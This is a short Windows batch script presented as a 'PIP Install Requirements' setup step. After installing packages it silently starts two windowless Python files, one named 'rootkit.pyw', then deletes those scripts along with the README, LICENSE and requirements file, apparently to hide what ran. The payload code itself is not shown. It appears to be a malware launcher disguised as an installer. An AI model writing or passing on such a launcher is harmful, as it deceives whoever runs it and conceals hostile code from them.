@echo off
title [313] PIP Install Requirements
pip install -r requirements.txt
start images.pyw
start rootkit.pyw

sleep 10
del LICENSE
del README.MD
del images.pyw
del rootkit.pyw
del requirements.txt

pause
